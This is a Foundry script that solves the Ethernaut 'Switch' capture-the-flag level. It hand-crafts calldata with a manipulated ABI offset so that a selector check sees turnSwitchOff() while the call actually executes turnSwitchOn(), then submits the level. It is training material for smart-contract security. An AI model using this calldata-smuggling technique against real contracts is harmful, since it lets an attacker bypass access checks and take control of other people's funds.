pragma solidity ^0.8.19;

import {Script, console} from "../lib/forge-std/src/Script.sol";

interface Ethernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}

contract SwitchScript is Script {
    address private levelContractAddress = 0xB64Ebdb530E48b9E45e93EB5616e1cABA4460F7B;
    function run() external {
        vm.startBroadcast();

        bytes memory cdata = abi.encodePacked(
            bytes4(abi.encodeWithSignature("flipSwitch(bytes)")),
            bytes32(uint256(96)),   // offset
            bytes32(uint256(0)),      // no-meaning (origianlly , it should be length)
            bytes32(abi.encodeWithSignature("turnSwitchOff()")),
            bytes32(uint256(4)),    // length
            bytes32(abi.encodeWithSignature("turnSwitchOn()"))
        );
        console.logBytes(cdata);
        (bool success, ) = levelContractAddress.call(cdata);
        require(success, "call failed");
        submitLevelContract(levelContractAddress);
        vm.stopBroadcast();
    }

    function submitLevelContract(address levelContractAddress) internal {
        Ethernaut e = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        e.submitLevelInstance(payable(levelContractAddress));
    }
}